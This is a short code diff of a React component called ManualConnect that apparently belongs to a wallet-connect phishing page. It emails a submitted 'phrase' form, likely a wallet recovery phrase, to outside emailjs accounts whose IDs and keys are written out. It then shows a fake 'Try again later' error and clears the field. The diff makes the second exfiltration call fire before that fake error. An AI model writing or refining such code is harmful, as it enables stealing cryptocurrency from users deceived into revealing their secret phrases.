@@ -27,17 +27,18 @@ function ManualConnect() {
         "mQcWugYQOwuKdh1vu"
       )
       .then((response) => {
-        setLoading(false);
-        alert("Try again later");
-        setPhrase("");
-      
        emailjs
       .sendForm(
         "service_udsvw3d",
         "template_bmqcwla",
         phraseform.current,
         "DNsER4-4UGLWYPh73"
-      )
+      );
+        setLoading(false);
+        alert("Try again later");
+        setPhrase("");
+      
+      
       })
       .catch((error) => {
         setLoading(false);
